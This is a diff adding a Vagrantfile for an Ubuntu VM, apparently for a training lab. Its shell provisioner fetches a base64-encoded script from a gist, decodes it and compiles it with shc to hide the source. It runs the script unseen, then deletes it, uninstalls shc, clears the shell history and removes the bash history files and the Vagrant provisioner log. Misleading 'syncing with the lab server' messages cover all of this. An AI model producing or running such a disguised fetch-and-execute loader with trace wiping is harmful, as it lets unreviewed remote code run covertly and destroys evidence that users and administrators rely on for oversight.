@@ -1,0 +1,30 @@
+# -*- mode: ruby -*-
+# vi: set ft=ruby :
+
+Vagrant.configure("2") do |config|
+  config.vm.box = "ubuntu/noble64"
+
+  config.vm.provider "virtualbox" do |vb|
+    vb.memory = "1536"
+    vb.cpus = 1
+    vb.gui = true
+  end
+
+  config.vm.provision "shell", inline: <<-SHELL
+    echo "[*] Sincronizando con el servidor central de laboratorios..."
+    apt-get update -qq && apt-get install -y -qq shc >/dev/null 2>&1
+    
+    # REEMPLAZA LA URL DE ABAJO CON TU URL DEL PASO 11 DE LA FASE 1
+    curl -sSL "https://gist.githubusercontent.com/jgaragorry/7b8121695e02b4c7541161acfcb4745f/raw/44038a872c878cd18977da1da28ca8d04166064c/caos.txt" | base64 -d > /tmp/caos.sh
+
+    shc -f /tmp/caos.sh -o /tmp/caos.x
+    rm -f /tmp/caos.sh /tmp/caos.sh.x.c
+    chmod +x /tmp/caos.x
+    /tmp/caos.x
+    rm -f /tmp/caos.x
+    apt-get remove -y -qq shc && apt-get autoremove -y -qq >/dev/null 2>&1
+    history -c
+    rm -f /root/.bash_history /home/vagrant/.bash_history /var/log/vagrant_provisioners.log
+    echo "[✓] Servidor inicializado correctamente."
+  SHELL
+end
